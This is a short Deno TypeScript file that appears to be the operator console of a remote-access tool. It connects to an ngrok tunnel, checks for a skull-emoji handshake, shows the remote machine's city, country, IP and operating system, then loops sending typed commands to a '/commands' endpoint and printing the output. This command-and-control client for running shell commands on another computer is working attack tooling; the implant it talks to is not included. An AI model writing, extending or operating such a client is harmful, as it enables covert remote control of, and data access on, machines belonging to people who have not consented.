import * as ink from "https://deno.land/x/ink@1.3/mod.ts";
import * as peo from "https://denopkg.com/iamnathanj/cursor@v2.2.0/mod.ts";

import { ping } from "./src/ping.ts";

// clear screen
await peo.clearScreen();

interface IIp {
  country: string;
  city: string;
  query: string;
}

(async function main() {
  console.log(
    " Type a url like this: https://026f-181-58-226-188.ngrok.io (without a / the end.)\n",
    (await Deno.readTextFile("welcome.txt")) + "\n",
    "Version: v0.0.2\n",
    "Type <ctrl + c> to exit.\n"
  );

  const url: string | null = prompt("Enter the ngrok url:");

  if (!url || url.length < 1) return console.log("Put a valid URL!");

  const checkConection: Response = await fetch(url, { method: "GET" }),
    isConected: string = await checkConection.text();

  if (isConected !== "💀")
    return console.log(
      ink.colorize("<red>Unable to conect, check the url.</red>")
    );

  console.log(ink.colorize("<green>      Conencted!</green>"));

  const getIp: Response = await fetch(`${url}/ip`, { method: "GET" }),
    ip: IIp = await getIp.json();

  const getOs: Response = await fetch(`${url}/ip/os`, { method: "GET" }),
    os: string = await getOs.text();

  console.log(
    ink.colorize(" <blue>     Connection      </blue>\n"),
    ink.colorize(`<cyan> City:     ${ip.city} </cyan>\n`),
    ink.colorize(`<green> Country:  ${ip.country} </green>\n`),
    ink.colorize(`<magenta> Ip:       ${ip.query} </magenta>\n`),
    ink.colorize(`<yellow> Os:       ${os} </yellow>\n`)
  );

  while (true) {
    ping(url);
    const input = prompt(" 💀 >");

    const rawResponse = await fetch(`${url}/commands/ansitrue`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        command: input,
      }),
    });

    console.log("\n" + (await rawResponse.json()));
  }
})();
